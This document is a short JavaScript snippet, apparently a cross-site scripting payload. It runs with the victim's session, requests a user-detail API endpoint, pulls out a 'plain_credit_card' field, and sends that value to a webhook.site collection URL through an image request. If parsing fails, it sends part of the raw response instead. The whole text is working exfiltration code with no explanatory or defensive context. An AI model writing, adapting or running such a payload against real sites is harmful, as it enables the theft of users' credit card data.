fetch("/api/user.php?action=detail_info")
  .then(res => res.text())
  .then(txt => {
    try {
      const data = JSON.parse(txt);
      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" +
        encodeURIComponent(data.message?.plain_credit_card || 'N/A');
    } catch (e) {
      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=INVALID_JSON&raw=" +
        encodeURIComponent(txt.slice(0, 100));
    }
  });
